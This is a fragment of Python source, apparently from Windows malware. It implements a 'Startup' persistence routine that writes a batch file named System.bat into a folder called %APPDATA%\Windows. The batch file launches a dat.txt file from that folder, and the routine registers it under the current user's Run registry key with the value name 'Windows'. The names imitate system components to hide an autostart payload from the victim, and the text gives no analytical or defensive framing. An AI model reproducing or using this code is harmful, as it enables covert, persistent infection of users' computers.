...
class Startup:
    def __init__(self) -> None:
        self.working_dir = os.getenv("APPDATA") + "\\Windows"
    ...
    def write_stub(self) -> None:
        ...
        with open(file=f"{self.working_dir}\\System.bat", mode="w") as f:
            f.write(f"@echo off\ncall {self.working_dir}\\dat.txt")

    def regedit(self) -> None:
        subprocess.run(args=[
                       "reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Windows", "/f"], shell=True)
        subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                       "/v", "Windows", "/t", "REG_SZ", "/d", f"{self.working_dir}\\System.bat", "/f"], shell=True)
